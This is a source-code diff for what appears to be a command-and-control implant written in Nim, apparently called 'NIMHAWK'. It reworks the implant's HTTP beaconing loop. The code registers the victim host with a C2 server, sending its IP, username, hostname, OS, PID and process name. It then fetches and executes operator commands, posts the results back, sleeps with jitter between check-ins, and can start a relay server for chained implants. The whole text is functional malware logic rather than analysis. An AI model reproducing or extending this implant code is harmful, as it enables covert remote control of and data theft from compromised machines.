@@ -675,8 +675,9 @@ proc httpHandler() {.async.} =
             let pid = getCurrentPID()
             let processName = getCurrentProcessName()
             
-            # Determine relay role based on compilation parameters
-            let relayRole = determineRelayRole()
+            # HTTP relay system: role is determined by RELAY_CHAIN/RELAY_PORT compile flags
+            # Legacy: let relayRole = determineRelayRole()
+            let relayRole = "standard"  # Default role, HTTP relay uses compile-time flags
             
             webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                                  osInfo, pid, processName, false, relayRole)
@@ -722,7 +723,8 @@ proc httpHandler() {.async.} =
                 echo ""
                 echo ""
                 echo "┌─ 🌐 HTTP HANDLER CYCLE #" & $httpCycleCount
-                echo "├─ C2: " & listener.implantCallbackIp & ":" & listener.listenerPort & " │ Sleep: " & $listener.sleepTime & "s │ Relay: " & $g_relayServer.isListening
+                # Legacy: │ Relay: " & $g_relayServer.isListening
+                echo "├─ C2: " & listener.implantCallbackIp & ":" & listener.listenerPort & " │ Sleep: " & $listener.sleepTime & "s │ HTTP Relay System"
                 echo "└─────────────────────────────────────────────────────────"
                 echo ""
                 echo "[DEBUG] 🌐 HTTP Handler: Starting polling cycle"
@@ -742,6 +744,9 @@ proc httpHandler() {.async.} =
             
             g_relayRegistrations = @[]  # Clear processed registrations
             
+            # HTTP Relay System: Legacy relay server polling code commented out
+            # The HTTP relay system doesn't use g_relayServer - it uses startHttpRelayServer() from http_relay.nim
+            #[
             # 1.5. CRITICAL: Poll relay server for messages (if running)
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: ═══════════════════════════════════════════════════"
@@ -1345,6 +1350,9 @@ proc httpHandler() {.async.} =
                     echo ""
                 
                 # 1.5. Legacy topology system removed - using distributed chain relationships
+            ]#
+            
+            # End of legacy relay server polling block
             
             # 2. Handle command results - send to C2
             for result in g_commandsToC2:
@@ -1378,6 +1386,9 @@ proc httpHandler() {.async.} =
                         echo "[DEBUG] 🚫 HTTP Handler: Ignoring internal status message: " & cmd
                         echo "[DEBUG] 🚫 HTTP Handler: This is NOT a real command, skipping processing"
                 else:
+                    # HTTP Relay System: Legacy intelligent routing commented out
+                    # In HTTP relay system, commands are routed via X-Next-Hop headers, not via relay_commands
+                    #[
                     # INTELLIGENT ROUTING: Check if command is for this relay server or downstream routing
                     let connectedClients = relay_commands.getConnectedClients(g_relayServer)
                     let currentRelayServerID = getRelayServerID()
@@ -1445,69 +1456,43 @@ proc httpHandler() {.async.} =
                             # Fallback to local processing if routing fails
                             shouldRouteDownstream = false
                     
-                    if not shouldRouteDownstream:
-                        # LOCAL PROCESSING: Process command on relay server itself
+                    ]#
+                    
+                    # HTTP Relay System: Simple local command processing
+                    when defined debug:
+                        echo "[DEBUG] 🌐 LOCAL PROCESSING: Processing command locally"
+                        echo "📨 COMMAND: " & cmd
+                        if args.len > 0:
+                            echo "📝 ARGUMENTS: " & $args
+                        echo "🏷️  GUID: " & cmdGuid
+                    
+                    let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 💥 COMMAND EXECUTED - SENDING RESPONSE"
+                        echo "📤 RESPONSE: " & (if result.len > 200: result[0..199] & "..." else: result)
+                        echo "🏷️  GUID: " & cmdGuid
+                    
+                    # Check if this is the relay start command
+                    if result.startsWith("RELAY_START:"):
+                        let port = parseInt(result.split(":")[1])
                         when defined debug:
-                            echo "[DEBUG] 🌐 LOCAL PROCESSING: Processing command on relay server"
-                        
-                        # ========== SUPER PROMINENT DEBUG START (HTTP HANDLER) ==========
-                        when defined debug:
-                            echo ""
-                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                            echo "⚡                                                                    ⚡"
-                            echo "⚡                     NIMHAWK HTTP HANDLER EXECUTION              ⚡"
-                            echo "⚡                                                                    ⚡"
-                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                            echo "🆔 IMPLANT ID OBTAINED: " & listener.id
-                            echo "🛤️  ROUTE: [DIRECT TO C2]"
-                            echo "📨 COMMAND RECEIVED AFTER DECRYPT: " & cmd
-                            if args.len > 0:
-                                echo "📝 ARGUMENTS: " & $args
-                            echo "🏷️  GUID: " & cmdGuid
-                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                            echo ""
-                        
-                        let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
-                        
-                        # ========== SUPER PROMINENT RESPONSE DEBUG (HTTP HANDLER) ==========
-                        when defined debug:
-                            echo ""
-                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                            echo "💥                                                                    💥"
-                            echo "💥                HTTP HANDLER COMMAND EXECUTED - SENDING RESPONSE  💥"
-                            echo "💥                                                                    💥"
-                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                            echo "📤 RESPONSE TO SEND PRE-ENCRYPT: " & result
-                            echo "🆔 IMPLANT ID: " & listener.id
-                            echo "🛤️  ROUTE: [DIRECT TO C2]"
-                            echo "🏷️  GUID: " & cmdGuid
-                            echo "📏 RESPONSE SIZE: " & $result.len & " bytes"
-                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                            echo ""
+                            echo "[RELAY] 🚀 Starting HTTP relay server on port: " & $port
+                        try:
+                            # Start relay server asynchronously
+                            await relay_launcher.startRelayServerAsync(listener.id)
+                            webClientListener.postCommandResults(listener, cmdGuid, "HTTP Relay server started on port " & $port)
+                        except Exception as e:
+                            webClientListener.postCommandResults(listener, cmdGuid, "Failed to start relay server: " & e.msg)
+                    else:
                         webClientListener.postCommandResults(listener, cmdGuid, result)
-                        
-                        when defined debug:
-                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed locally and result sent to C2"
-                            echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
-                                 (if result.len > 200: result[0..199] & "..." else: result)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
             
-            # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
-            let connectionStats = relay_commands.getConnectionStats(g_relayServer)
-            let sleepMs = if g_relayServer.isListening and connectionStats.registeredClients > 0:
-                # ADAPTIVE timing when relay clients are connected - adjust based on network health
-                let baseTime = if g_serverFastMode: 500 else: 1000
-                let adaptiveTime = int(float(baseTime) * g_networkHealth.adaptiveMultiplier)
-                # Apply safety bounds: min 200ms, max 15s
-                min(max(adaptiveTime, 200), 15000)
-            elif g_relayServer.isListening and g_serverFastMode:
-                # FORCE fast timing when relay server has fast mode clients
-                g_adaptiveMaxSleep  # 1000ms for fast clients, 2000ms for normal
-            elif listener.sleepTime > 2:
-                # Normal case for high sleep time configs
-                g_adaptiveMaxSleep  # Use adaptive timing based on client mode
-            else:
-                # Low sleep time configs use original timing
-                listener.sleepTime * 1000
+            # 4. Sleep with jitter (like normal implant)
+            # HTTP Relay System: Simplified sleep logic
+            let sleepMs = listener.sleepTime * 1000  # Simple fixed sleep based on config
             
             let jitterMs = if listener.sleepJitter > 0:
                 int(float(sleepMs) * (listener.sleepJitter / 100.0) * rand(1.0))
@@ -1517,22 +1502,10 @@ proc httpHandler() {.async.} =
             let totalSleepMs = sleepMs + jitterMs
             
             when defined debug:
-                echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (adaptive mode - fast: " & 
-                     $g_serverFastMode & ", base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
-                echo "[DEBUG] 🌐 HTTP Handler: Timing decision analysis:"
-                echo "[DEBUG] 🌐 HTTP Handler: - Relay server listening: " & $g_relayServer.isListening
-                echo "[DEBUG] 🌐 HTTP Handler: - Total connections: " & $connectionStats.connections & ", Registered clients: " & $connectionStats.registeredClients
-                echo "[DEBUG] 🌐 HTTP Handler: - Server fast mode: " & $g_serverFastMode
-                echo "[DEBUG] 🌐 HTTP Handler: - Adaptive max sleep: " & $g_adaptiveMaxSleep & "ms"
-                echo "[DEBUG] 🌐 HTTP Handler: - Original listener sleep time: " & $listener.sleepTime & "s"
-                echo "[DEBUG] 🌐 Network Throttling Status:"
-                echo "[DEBUG] 🌐 - Network RTT: " & $g_networkHealth.rtt.int & "ms"
-                echo "[DEBUG] 🌐 - Is slow network: " & $g_networkHealth.isSlowNetwork
-                echo "[DEBUG] 🌐 - Adaptive multiplier: " & $g_networkHealth.adaptiveMultiplier
-                echo "[DEBUG] 🌐 - Consecutive errors: " & $g_networkHealth.consecutiveErrors
-                if g_networkHealth.consecutiveErrors > 0:
-                    echo "[DEBUG] 🚨 - Network experiencing issues, using backoff timing"
+                echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
             
+            # HTTP Relay System: Legacy chain info reporting commented out
+            #[
             # 5. CHAIN INFO REPORTING (New distributed topology approach)
             try:
                 # Report our chain info to C2 - much simpler than full topology
@@ -1665,6 +1638,7 @@ proc httpHandler() {.async.} =
             except Exception as chainError:
                 when defined debug:
                     echo "[DEBUG] 🔗 Chain Info: Error: " & chainError.msg
+            ]#
             
             await sleepAsync(totalSleepMs)
             
@@ -1683,6 +1657,10 @@ proc httpHandler() {.async.} =
                 echo "[DEBUG] 🌐 HTTP Handler: Exception details: " & e.getStackTrace()
             await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep
 
+# HTTP Relay System: Legacy relay client handler commented out
+# The HTTP relay system doesn't use a separate relay client handler
+# Instead, webClientListener handles RELAY_CHAIN directly via X-Next-Hop headers
+#[
 # Async relay client handler
 proc relayClientHandler(host: string, port: int) {.async.} =
     when defined debug:
@@ -2470,7 +2448,10 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             when defined debug:
                 echo "[DEBUG] Relay client error: " & e.msg
             await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep
+]#
 
+# HTTP Relay System: Legacy safe wrappers also commented out
+#[
 # Safe async wrappers to prevent event loop crashes - FIXED ASYNC RECURSION CASCADE
 var g_relayClientRunning = false
 var g_httpHandlerRunning = false
@@ -2518,6 +2499,7 @@ proc safeHttpHandler() {.async.} =
         g_httpHandlerRunning = false
         when defined debug:
             echo "[CLEANUP] 🧹 HTTP handler stopped, flag reset"
+]#
 
 # Main execution function
 proc runMultiImplant*() {.async.} =
@@ -2553,22 +2535,11 @@ proc runMultiImplant*() {.async.} =
             echo "[DEBUG] ✅ Starting HTTP handler with safe restart"
             echo "[DEBUG] 🔄 Running main loop..."
         
-        # Safe main loop for HTTP handler
-        while true:
-            try:
-                when defined debug:
-                    echo "[MAIN] 🚀 Starting HTTP handler (safe mode)"
-                
-                await safeHttpHandler()
-                
-                when defined debug:
-                    echo "[MAIN] 🔄 HTTP handler ended, restarting in 5 seconds..."
-                
-                await sleepAsync(5000)  # Wait before restart
-            except Exception as e:
-                when defined debug:
-                    echo "[MAIN] 💥 Critical error in main HTTP loop: " & e.msg
-                await sleepAsync(10000)  # Longer wait on critical error
+        # HTTP Relay System: Direct HTTP handler (no safe wrapper needed)
+        when defined debug:
+            echo "[MAIN] 🚀 Starting HTTP handler"
+        
+        await httpHandler()
 
 # Entry point
 when isMainModule:
